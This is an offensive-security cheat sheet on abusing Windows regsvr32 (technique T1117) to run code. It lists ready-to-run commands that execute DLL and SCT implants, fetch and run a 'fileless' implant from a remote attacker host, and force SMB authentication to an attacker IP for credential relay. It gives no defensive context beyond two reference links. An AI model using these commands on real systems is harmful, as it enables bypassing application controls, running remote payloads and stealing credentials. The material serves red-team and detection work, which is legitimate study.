# Regsvr32

Search Tag(s): #T1117

Execute DLL implant.

```
C:\> regsvr32.exe /s implant.dll
```

Execute a SCT implant.

```
C:\> regsvr32.exe /s /u /i:implant.sct scrobj.dll
```

Execute a fileless implant.

```
C:\> regsvr32.exe /s /u /i:http[s]://<IP>[:PORT]/implant.sct scrobj.dll
```

Execute command to perform SMB authentication relay.

```
C:\> regsvr32.exe /s /u /i://<attacker_IP>/@snare scrobj.dll
```

---
## References

https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/

https://www.ired.team/offensive-security/code-execution/t1117-regsvr32-aka-squiblydoo